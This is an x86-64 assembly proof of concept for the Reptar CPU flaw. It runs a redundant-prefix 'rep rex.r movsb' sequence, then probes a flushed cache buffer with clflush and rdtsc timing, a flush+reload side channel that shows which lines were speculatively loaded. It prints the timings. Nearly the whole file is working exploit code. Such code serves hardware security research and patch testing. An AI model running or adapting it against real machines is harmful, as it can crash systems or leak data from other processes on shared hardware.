BITS 64

global _start

%define OUTPUT_SIZE 32
%define OBF_PRIME 7

section .data
    crash_pad: times 0x10000 db 0
    far_away: times 0x1000 db 0
    output: times OUTPUT_SIZE * 4 db 0

section .text
    clean_crash_pad:
        %assign i 0
        %rep 0x10000 / 64
            clflush [crash_pad + i * 64]
            %assign i i+1
        %endrep
        ret

    check_leak:
        %assign i 0
        %rep OUTPUT_SIZE
            mfence
            rdtsc
            mov r10, rax
            mov rax, [crash_pad + (64 * OBF_PRIME) * i]
            mfence
            rdtsc
            sub rax, r10
            mov [output + 4 * i], eax
            %assign i i + 1
        %endrep
        ret
    
    print_output:
        mov rax, 1
        mov rdi, 1
        mov rsi, output
        mov rdx, OUTPUT_SIZE * 4
        syscall
        ret
    
    exit:
        mov rax, 60
        mov rdi, 0
        syscall
        ret

    _start:
        call clean_crash_pad
        lea eax, [crash_pad + 3 * 64 * OBF_PRIME ]
        mov ebx, 64 * OBF_PRIME
        xor ecx, ecx
        lea rsi, [rsp]
        lea rdi, [rsp]
        lea r11, [far_away]
        mov [r11], r11
        clflush [r11]
        align 0x1000
        .reptar:
            ; 16 bytes
            cmp [r11], rbx    ; 3 bytes
            jne .after_reptar ; 6 bytes
            inc ecx           ; 2 bytes
            add eax, ebx      ; 2 bytes
            mov ebp, [eax]    ; 3 bytes
            ; 16 bytes
            clflush [rsp+127] ; 4 bytes
            mov [rsp], rax    ; 4 bytes
            rep               ; 1 byte
            db 0x44; rex.r    ; 1 byte
            movsb             ; 1 byte
            rep               ; 1 byte
            nop               ; 1 byte
        align 0x1000
        times 0x1000*8 rep pause
        .after_reptar:
            call check_leak
            call print_output
            call exit
